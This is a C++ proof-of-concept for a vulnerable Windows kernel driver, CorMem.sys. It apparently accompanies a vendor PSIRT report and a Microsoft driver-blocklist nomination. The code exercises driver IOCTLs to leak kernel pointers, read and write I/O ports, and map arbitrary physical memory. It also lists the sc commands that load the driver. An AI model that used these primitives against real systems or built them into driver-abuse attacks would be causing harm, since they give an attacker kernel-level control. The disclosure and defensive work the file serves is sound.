// poc_cormem.cpp - proves the CorMem.sys primitives without trashing anything.
//
// three checks, in increasing order of severity:
//   1. 0x222008  - driver hands out its own kernel function pointers
//   2. 0x222014/18 - port io, read the RTC seconds register twice, expect +1
//   3. 0x22200C  - map the fixed physical page 0xFFDF0000 (backs KUSER_SHARED_DATA
//                  at 0x7FFE0000). if the driver maps it, that's arbitrary phys.
//
// needs admin + the driver running:
//   sc create CorMem type= kernel binPath= C:\path\to\CorMem.sys
//   sc start CorMem
//   poc.exe
//   sc stop CorMem && sc delete CorMem
//
// disclosure context: attached to the Teledyne PSIRT report and the Microsoft
// Vulnerable Driver Blocklist nomination. use only on systems you own.

#include <cstdio>
#include "cormem.h"

int main() {
    CorMemDriver drv;
    if (!drv.Open()) {
        wprintf(L"[-] Open(%s) failed, err=%lu. Driver installed and started?\n",
                CORMEM_DEVICE_PATH, GetLastError());
        return 1;
    }
    wprintf(L"[+] Device opened: %s\n", CORMEM_DEVICE_PATH);

    // 1. kernel pointer disclosure
    CORMEM_FUNC_TABLE tbl{};
    if (drv.GetFunctionTable(tbl)) {
        wprintf(L"[+] Primitive 1 (kernel ptr leak): [0]=%p [1]=%p\n",
                (void*)tbl.KernelPointers[0], (void*)tbl.KernelPointers[1]);
    } else {
        wprintf(L"[!] Primitive 1 failed (err=%lu)\n", GetLastError());
    }

    // 2. arbitrary I/O port access via the RTC clock
    uint8_t s1 = drv.RtcRead(0x00);
    Sleep(1100);
    uint8_t s2 = drv.RtcRead(0x00);
    wprintf(L"[+] Primitive 2 (I/O port R/W): RTC seconds 0x%02X -> 0x%02X (BCD, expect +1)\n",
            s1, s2);
    if (s1 != s2)
        wprintf(L"[+] ring-0 port io from user mode confirmed\n");

    // 3. arbitrary physical memory map
    uint64_t kva1 = drv.MapPhysical(0xFFDF0000ULL);
    uint64_t kva2 = drv.MapPhysical(0xFFDF0000ULL);
    if (kva1 && kva2) {
        wprintf(L"[+] Primitive 3 (phys map): KUSER_SHARED_DATA phys 0xFFDF0000\n");
        wprintf(L"    kernel VA (view 1) = 0x%016llX\n", kva1);
        wprintf(L"    kernel VA (view 2) = 0x%016llX   (distinct views, same page)\n", kva2);
        wprintf(L"[+] Admin->kernel arbitrary physical R/W confirmed.\n");
    } else {
        wprintf(L"[!] Primitive 3 failed (err=%lu)\n", GetLastError());
    }

    drv.Close();
    return 0;
}